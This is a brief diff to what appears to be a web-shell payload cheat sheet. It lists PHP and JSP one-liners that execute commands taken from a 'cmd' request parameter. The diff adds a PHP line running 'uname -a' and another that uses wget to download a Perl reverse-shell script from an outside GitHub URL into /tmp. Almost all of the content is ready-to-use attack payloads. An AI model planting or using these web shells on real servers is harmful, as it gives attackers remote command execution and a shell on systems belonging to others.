@@ -5,6 +5,8 @@ PHP:
 <?php echo shell_exec($_GET['cmd']); ?>
 <?php system($_GET['cmd']); ?>
 <? echo passthru($_GET['cmd']); ?>
+<?php system('uname -a')?>
+<?php system('wget https://raw.githubusercontent.com/analyticsearch/systemshell/master/perlrev.pl -O /tmp/rev.pl')?>
 
 JSP:
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
